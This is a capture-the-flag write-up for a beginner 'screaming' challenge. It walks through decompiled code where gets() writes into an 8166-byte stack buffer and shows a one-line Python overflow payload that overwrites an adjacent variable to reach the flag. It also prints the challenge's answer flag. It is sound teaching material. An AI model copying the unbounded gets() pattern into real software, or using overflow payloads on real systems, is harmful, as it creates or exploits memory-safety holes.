---
title: "screaming - Advent Of CTF"
date: 2025-01-01 00:00:00 -0800
categories: CTF AoCTF
tags: rev_eng
---

# CTF

AAAAA- I'm not screaming, I'm just buffer overflowing my emotions!

## Attachments

[chall](https://files.vipin.xyz/api/public/dl/RUU8-57Z/advent-of-ctf-csd/screaming/chall)

# Solution

It's logical that this is buffer overflow, so let's look at the source code using ghidra.

The main part of the code is:

```cpp
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_1ff8 [8166];
  char local_12;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_12 = '\0';
  gets(local_1ff8);
  if (local_12 == '\0') {
    puts("not that easy pal :| ");
  }
  else {
    win();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return 0;
}



void _fini(void)

{
  return;
}
```

Here we can see two main variables, one is `local_1ff8` and second is `local_12`. If we take a look at the code, we'll see that we have to rewrite `local_12` Which we can do by `buffer overflow`.

To do buffer overflow, we have to write more than the capacity of the char array, which is `local1_ff8` in this case. since the char has a capacity of 8166, we have to write more than 8166 (Min of 8167) to change the value of `local_12`.

We can accomplish this easily by using python:

```sh
jstr$ python3 -c "print('A'*8166 + 'B')" > payload.txt
jstr$ cat payload.txt | ./chall
Day 2 gotta keep it simple :) Here is the flag: csd{d4y_2_H0w_r_u?}
```

The answer is: `csd{d4y_2_H0w_r_u?}`
